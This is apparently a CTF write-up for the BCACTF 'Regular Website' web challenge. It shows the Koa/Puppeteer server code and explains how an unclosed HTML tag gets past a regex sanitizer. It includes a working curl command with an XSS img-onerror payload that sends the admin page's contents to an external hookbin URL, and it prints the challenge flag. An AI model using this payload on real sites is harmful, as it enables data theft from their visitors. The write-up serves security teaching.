# Regular Website | Web

### Solution

From ctf we have got url to website, *package.json* and *server.ts*

##### server.ts
```ts
import Router from '@koa/router';
import Koa from 'koa';
import koaStatic from 'koa-static';
import bodyParser from 'koa-bodyparser';
import { launch } from 'puppeteer';
import { readFileSync } from 'fs';

const flag = readFileSync("flag.txt", "utf8");
const verbs = readFileSync("verbs.txt", "utf8").split("\n").map(s => s.trim()).filter(s => {
    return s.length > 0 && !s.startsWith("#");
});

const app = new Koa();
const browser = launch({args: ["--incognito", "--no-sandbox"]});

const router = new Router();
router.post("/", async ctx => {
    if (typeof ctx.request.body !== "object") {
        ctx.throw(400, "body must be an object");
        return;
    }
    const text = ctx.request.body.text;
    if (typeof text !== "string") {
        ctx.throw(400, "text must be a string");
        return;
    }

    const sanitized = text.replace(/<[\s\S]*>/g, "XSS DETECTED!!!!!!");
    const page = await (await browser).newPage();
    await page.setJavaScriptEnabled(true);
    try {
        await page.setContent(`
        <!DOCTYPE html>
        <html>
            <head>
                <meta charset="utf-8">
                <title>Comment</title>
            </head>
            <body>
                <p>Welcome to the Regular Website admin panel.</p>
                <h2>Site Stats</h2>
                <p><strong>Comments:</strong> ???</p>
                <p><strong>Flag:</strong> ${flag}</p>
                <h2>Latest Comment</h2>
                ${sanitized}
            </body>
        </html>
        `, {timeout: 3000, waitUntil: "networkidle2"});
    } catch (e) {
        console.error(e);
        ctx.status = 500;
        ctx.body = "error viewing comment";
        await page.close();
        return;
    }
    ctx.body = `The author of this site has ${verbs[Math.floor(Math.random() * verbs.length)]} your comment.`;
    await page.close();
});

app.use(bodyParser());
app.use(router.routes());
app.use(koaStatic("../public"));
app.listen(1337);
console.log("Listening on port 1337");
```

##### package.json
```json
{
    "main": "dist/server.js",
    "scripts": {
        "build": "tsc",
        "build:watch": "tsc -w",
        "start": "node dist/server.js"
    },
    "dependencies": {
        "@koa/router": "^10.0.0",
        "koa": "^2.13.1",
        "koa-bodyparser": "^4.3.0",
        "koa-static": "^5.0.0",
        "puppeteer": "^10.0.0"
    },
    "devDependencies": {
        "@types/koa": "^2.13.3",
        "@types/koa-bodyparser": "^4.3.1",
        "@types/koa-static": "^4.0.1",
        "@types/koa__router": "^8.0.4",
        "@types/node": "^15.12.2",
        "typescript": "^4.3.2"
    }
}
```



To get the flag we need to read the content of a website that admin view when we leave a comment. <br />
From the source code we know that website doesn't have any sanitizer for user input, except for one - regex. <br>
This regex block every input that have html tag pattern (< *any text here* >). Because html is not programming language and don't have any error handler we can simply don't close the tag - html will do it for us<br /> <br >

I used [this website](https://hookbin.com) to create a link with parameter that will include all content of the visited website. After that I created request with curl that as a comment send fake image with payload inside (ofc image src refer to created link): 
```bash
$ curl "webp.bcactf.com:49155" -X POST -H 'Content-Type:application/json' --data-raw '{"text": "<img src=\"#\" onerror=\"window.location=\'https://hookb.in/RZ6X7LXBgnSREEj7DeGO?c=\'+document.body.textContent\""}'
```
Response of that command resulted with content of visited by admin page

### Flag

bcactf{h3_c0mes_Ur74hshR}

#### Credits

- Writeup by [HuntClauss](https://ctftime.org/user/106464)
- Solved by [HuntClauss](https://ctftime.org/user/106464)
- WaletSec 2021

#### License

**CC BY 4.0** WaletSec + HuntClauss